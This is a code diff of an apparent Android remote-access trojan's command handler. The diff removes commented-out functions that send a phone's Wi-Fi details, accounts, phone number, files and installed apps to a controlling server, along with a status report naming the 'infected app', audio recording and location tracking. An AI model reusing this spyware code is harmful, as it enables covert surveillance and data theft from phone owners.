@@ -124,138 +124,15 @@ public class SafeCommands {
         } else if (fromServer.equalsIgnoreCase(COMMANDS[22])) {
             installedApps();
         }
-    }
 
-    private void getWiFiNetworks() {
-        ConnectivityManager connManager = (ConnectivityManager) context.getSystemService(Context.CONNECTIVITY_SERVICE);
-        NetworkInfo mWifi = connManager.getNetworkInfo(ConnectivityManager.TYPE_WIFI);
-        WifiManager wifiMgr = (WifiManager) context.getSystemService(Context.WIFI_SERVICE);
-        WifiInfo wifiInfo = wifiMgr.getConnectionInfo();
-        if(mWifi.isConnected()) {
-            comms.say("Connected to: " + wifiInfo.getSSID() + " " + wifiInfo.getBSSID() + " " + wifiInfo.getMacAddress());
-            comms.say("IP address  : " + Formatter.formatIpAddress(wifiInfo.getIpAddress()));
-        } else {
-            comms.say("Wifi not connected");
-        }
-        comms.say("Nearby access points:");
-        List<ScanResult> results = wifiMgr.getScanResults();
-        for (ScanResult result : results) {
-            comms.say(result.SSID + " " + result.BSSID + " " + result.level);
-        }
-    }
 
-    private void getAccounts() {
-        Account[] accounts = AccountManager.get(context).getAccounts();
-        StringBuilder sbAccounts = new StringBuilder();
-        sbAccounts.append("Accounts:\r\n");
-        if (accounts.length > 0) {
-            for (Account account : accounts) {
-                sbAccounts.append(account.toString());
-                sbAccounts.append("\r\n");
-            }
-        } else {
-            sbAccounts.append("Could not find any accounts");
-        }
-        comms.say(sbAccounts.toString());
-    }
-
-    private String getFirstAccount() {
-        Account[] accounts = AccountManager.get(context).getAccounts();
-        if (accounts.length > 0) {
-            return accounts[0].name;
-        } else {
-            return "null";
-        }
-    }
-
-    private void getPhoneNumber() {
-        TelephonyManager tMgr = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);
-        comms.say("" + tMgr.getLine1Number());
-    }
 
     private void getScreenShot(){
 
     }
 
-    // use AsyncTask to give some work out of hands to run toast on UI thread
-    private void toast(String message) {
-        new AsyncTask<String, Void, String>() {
-            @Override
-            protected String doInBackground(String[] params) {
-                String str = params[0];
-                return str.substring(6, str.length());
-            }
 
-            @Override
-            protected void onPostExecute(String message) {
-                Toast.makeText(context, message, Toast.LENGTH_SHORT).show();
-            }
-        }.execute(message);
-    }
 
-    private void dialog(String message) {
-        Intent i = new Intent(context, SafeDialog.class);
-        i.putExtra("message", message.substring(7, message.length()));
-        i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
-        context.startActivity(i);
-    }
-
-    private void listDir(String dir) {
-        if (dir.equals("")) {
-            comms.say("usage \"ls /\"");
-        }
-        try {
-            File directory = new File(Environment.getExternalStorageDirectory(), dir);
-            File[] listOfFiles = directory.listFiles();
-            if(listOfFiles.length > 0) {
-                for (File file : listOfFiles) {
-                    comms.say(file.getName());
-                }
-            } else {
-                comms.say("Directory is empty");
-            }
-        } catch (NullPointerException e) {
-            comms.say("w00ps");
-        }
-    }
-
-    private void sayStatus() {
-        WifiManager wifiMgr = (WifiManager) context.getSystemService(Context.WIFI_SERVICE);
-        WifiInfo wifiInfo = wifiMgr.getConnectionInfo();
-        String ssid = wifiInfo.getSSID();
-        if (ssid.equals("<unknown ssid>")) {
-            ssid += " probably on mobile data";
-        } else {
-            ssid += " state " + wifiInfo.getSupplicantState();
-        }
-        comms.say("########################################################");
-        comms.say("brand + model   = " + Build.BRAND + " " + Build.MODEL);
-        comms.say("primary account = " + getFirstAccount());
-        comms.say("wifi status     = " + ssid);
-        comms.say("recording audio = " + SafeService.isbAudioStarted());
-        comms.say("location track  = " + SafeService.isbLocationStarted());
-        comms.say("infected app    = " + context.getApplicationContext().getPackageName() + " v" + SafeService.VERSION);
-        comms.say("########################################################");
-    }
-
-    private void installedApps() {
-        StringBuilder sbApps = new StringBuilder();
-        sbApps.append("Installed apps:\r\n");
-        List<PackageInfo> packList = context.getPackageManager().getInstalledPackages(0);
-        List<String> apps = new ArrayList<>();
-        for (int i = 0; i < packList.size(); i++) {
-            PackageInfo packInfo = packList.get(i);
-            if ((packInfo.applicationInfo.flags & ApplicationInfo.FLAG_SYSTEM) == 0) {
-                apps.add(packInfo.applicationInfo.loadLabel(context.getPackageManager()).toString());
-            }
-        }
-        Collections.sort(apps);
-        for (int i = 0; i < apps.size(); i++) {
-            sbApps.append(apps.get(i));
-            sbApps.append("\r\n");
-        }
-
-        comms.say(sbApps.toString());
-    }*/
+    */
 
 }
